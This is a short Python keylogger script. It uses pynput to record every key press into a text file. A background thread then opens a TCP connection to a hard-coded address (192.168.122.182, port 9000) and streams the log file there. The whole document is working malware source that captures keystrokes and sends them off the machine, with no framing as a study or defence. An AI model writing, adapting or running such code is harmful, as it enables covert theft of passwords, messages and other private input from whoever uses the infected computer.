```python
from pynput import keyboard 
import socket, os
import threading 

LOG_FILE = "keylogs.txt"  # The logging file
with open(LOG_FILE, "w") as f:   # create or clear the logfile
    pass

def on_press(key):
    print('Key {} pressed'.format(key)) 
    with open(LOG_FILE, "a") as f:  ## Append to file
        f.write('{}\n'.format(str(key)))
         
def on_release(key):
    if key == keyboard.Key.esc:   # Stop listener when esc is pressed
        return False  

listener = keyboard.Listener(on_press=on_press, on_release=on_release) 
with listener: ## Needed to properly reschedule event.
    listener.join() 

def sendFile():   #Function for sending the keylogs.txt to server
    ip_address = "192.168.122.182"  
    port = 9000 
      
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## Creates TCP/IP Socket
    
    s.connect((ip_address, port))                           ## Connection to Server
  
    print('Connected')
          
    with open(LOG_FILE, 'rb') as file:
        while data := file.read(1024):     ## Read in chunks of 1024 bytes at a time. To send large files efficiently.
            s.sendall(data)                       # Sends the file via TCP Streaming.
             
    file.close()  # Close File after sending
              
    print('File sent')   ## This will print when we finish sending all data chunks
     
   
threading.Thread(target=sendFile, daemon=True).start() 
